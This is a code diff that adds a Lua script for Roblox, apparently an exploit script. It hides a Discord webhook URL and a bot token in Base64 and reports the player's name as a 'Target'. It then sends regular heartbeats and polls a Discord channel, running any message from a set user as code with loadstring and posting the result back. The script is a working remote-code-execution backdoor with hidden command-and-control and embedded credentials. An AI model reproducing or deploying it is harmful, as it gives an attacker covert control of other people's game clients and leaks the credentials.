@@ -1,0 +1,45 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local LP = Players.LocalPlayer
+local req = (syn and syn.request) or (http and http.request) or HttpService.RequestAsync
+local wUrl = HttpService:Base64Decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4Mjc4MDg3MjY4MzAyODYzMS9SdUpwanBLSmVaWk1yaDBYbF93S2VWZ3pPdHpsd0RHU0ppS2dPbVZPczRac3RsTGlrM3c0ekZfbzV4UTh5OUlJX3p6")
+local cId = HttpService:Base64Decode("MTQ4Mjc3ODM2MzEyMTc2NjQ5Mg==")
+local uId = HttpService:Base64Decode("MTM5NDM3NTcxMDI3NzI0MjkyMg==")
+local bTk = HttpService:Base64Decode("TVRVMk5EQTJNREUwTXpZeE9EZzROelk0TUEuR2cwZmZDLmFzb3pzemVJWFBLVUdUNXAyc3JlaUVwaG5MOTU0LUVqMC01amFF")
+local lMsg = "0"
+local function sLog(title, desc, color) pcall(function() req({Url = wUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode({embeds = {{title = title, description = "```lua\n" .. tostring(desc) .. "\n```", color = color or 3447003}}})}) end) end
+local function cStr(s) local c = s:gsub("```lua", ""):gsub("```", "") return c:match("^%s*(.-)%s*$") end
+sLog("Connected", "Target: " .. LP.Name .. "\nListening...", 65280)
+task.spawn(function() while true do task.wait(10) sLog("Alive", "", 3066993) end end)
+task.spawn(function() while true do
+    local s, r = pcall(function()
+        local u = "https://discord.com/api/v10/channels/" .. cId .. "/messages?limit=1"
+        return req({Url = u, Method = "GET", Headers = {["Authorization"] = "Bot " .. bTk}})
+    end)
+    if s and r and r.Body then
+        local o, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
+        if o and type(d) == "table" and #d > 0 then
+            local m = d[1]
+            if m.id ~= lMsg and tostring(m.author.id) == uId then
+                lMsg = m.id
+                local cmd = cStr(m.content)
+                if cmd ~= "" then
+                    task.spawn(function()
+                        local f, err = loadstring(cmd)
+                        if not f then
+                            sLog("Syntax Error", err, 15158332)
+                            return
+                        end
+                        local ok, res = pcall(f)
+                        if ok then
+                            sLog("Success", res, 15158332)
+                        else
+                            sLog("Runtime Error", res, 15158332)
+                        end
+                    end)
+                end
+            end
+        end
+    end
+    task.wait(2)
+end end)
